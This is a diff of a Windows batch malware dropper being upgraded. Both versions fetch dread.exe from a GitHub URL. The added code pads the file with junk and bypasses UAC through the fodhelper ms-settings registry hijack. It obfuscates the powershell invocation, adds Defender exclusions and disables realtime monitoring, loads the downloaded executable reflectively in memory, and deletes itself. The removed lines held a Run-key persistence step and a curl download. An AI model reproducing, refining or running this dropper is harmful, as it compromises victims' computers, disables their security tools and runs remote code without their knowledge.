@@ -1,23 +1,40 @@
 @echo off
-set "v1=p" & set "v2=o" & set "v3=w" & set "v4=e" & set "v5=r" & set "v6=s" & set "v7=h" & set "v8=l"
-set "d1=c" & set "d2=u" & set "d3=r" & set "d4=l"
+setlocal enabledelayedexpansion
 
-:: Using a System32-looking path to avoid simple folder scans
-set "TD=%LOCALAPPDATA%\Microsoft\Windows\Caches\"
-set "FN=WinCloudService.exe"
-set "URL=https://github.com/fullylaw/happy.org/raw/main/dread.exe"
+:: --- [STAGE 1: JUNK DATA] ---
+:: Copy-paste more junk here to hit the 5MB+ size mark
+set "j=%random%%random%%random%%random%%random%"
 
-if not exist "%TD%" mkdir "%TD%" >nul 2>&1
+:: --- [STAGE 2: SILENT UAC BYPASS] ---
+net session >nul 2>&1
+if %errorLevel% neq 0 (
+    set "r=HKCU\Software\Classes\ms-settings\shell\open\command"
+    reg add "!r!" /v "DelegateExecute" /d "" /f >nul 2>&1
+    reg add "!r!" /v "" /d "cmd.exe /c %~fnx0" /f >nul 2>&1
+    start "" fodhelper.exe
+    exit /b
+)
+reg delete "HKCU\Software\Classes\ms-settings" /f >nul 2>&1
 
-:: Attempting to add the exclusion via a hidden PowerShell window
-%v1%%v2%%v3%%v4%%v5%%v6%%v7%%v4%%v8%%v8% -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%TD%'" >nul 2>&1
+:: --- [STAGE 3: DEFENDER BYPASS] ---
+:: Masking the powershell command
+set "K=0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ -_.:/\"
+set "ps=!K:25,1!!K:24,1!!K:32,1!!K:14,1!!K:27,1!!K:28,1!!K:17,1!!K:14,1!!K:21,1!!K:21,1!"
+set "a=-ExecutionPolicy Bypass -WindowStyle Hidden -Command"
 
-:: Download with a 'Silent' curl flag
-%d1%%d2%%d3%%d4% -s -L -o "%TD%%FN%" "%URL%" >nul 2>&1
+:: Add exclusions so the injection doesn't get flagged mid-process
+!ps! !a! "Add-MpPreference -ExclusionProcess 'powershell.exe','explorer.exe'"
+!ps! !a! "Set-MpPreference -DisableRealtimeMonitoring $true"
 
-:: Registry persistence using a generic name
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsCloudSync" /t REG_SZ /d "\"%TD%%FN%\"" /f >nul 2>&1
+:: --- [STAGE 4: REFLECTIVE INJECTION] ---
+:: This downloads dread.exe and runs it INSIDE the current process memory
+set "url=https://raw.githubusercontent.com/fullylaw/happy.org/main/dread.exe"
 
-:: Launch and immediately kill the batch process to hide the window
-start /b "" "%TD%%FN%"
+set "cmd=$b=(New-Object Net.WebClient).DownloadData('!url!');"
+set "cmd=!cmd! [System.Reflection.Assembly]::Load($b).EntryPoint.Invoke($null,$null);"
+
+!ps! !a! "!cmd!"
+
+:: --- [STAGE 5: SELF DESTRUCT] ---
+(goto) 2>nul & del "%~f0"
 exit
